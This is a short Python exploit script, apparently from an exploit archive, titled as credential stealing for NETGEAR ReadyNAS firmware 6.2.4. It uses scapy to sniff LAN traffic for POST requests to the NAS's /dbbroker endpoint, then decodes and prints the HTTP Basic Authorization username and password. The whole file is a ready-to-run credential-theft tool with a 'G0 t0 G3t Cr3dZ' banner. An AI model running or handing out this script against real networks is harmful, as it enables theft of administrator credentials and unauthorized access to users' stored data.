#!/usr/bin/env python
#
# Exploit Title: NETGEAR ReadyNAS LAN /dbbroker Credential Stealing
# Date: 25/07/2015
# Exploit Author: St0rn
# Vendor Homepage: www.netgear.fr/business/products/storage/readynas
# Software Link: apps.readynas.com/pages/?page_id=143
# Version: Firmware 6.2.4
#

### Import ###
from scapy.all import *
from sys import argv,exit
from os import system

### Clear Function ###
def clear():
system("/usr/bin/clear")


### Function to get and decode credential ###
def getReadyNASCredz(p):
if p.haslayer(TCP) and p[IP].dst==argv[2]:
if p.haslayer(Raw):
if "POST /dbbroker" in p[Raw].load:
tmp=p[Raw].load
credz=tmp.split("\r\n")
for i in credz:
if "Authorization: Basic" in i:
print "-----------------".center(80)
print i.split(" ")[2].decode("base64").center(80)


### Main ###
if __name__ == '__main__':

clear()
if len(argv)<3:
print "Usage: %s [device] [NAS_IP]" %(argv[0])
exit(0)
else:
print "\n"
print "#################".center(80)
print "#G0 t0 G3t Cr3dZ#".center(80)
print "#################\n".center(80)

sniff(prn=getReadyNASCredz,iface=argv[1])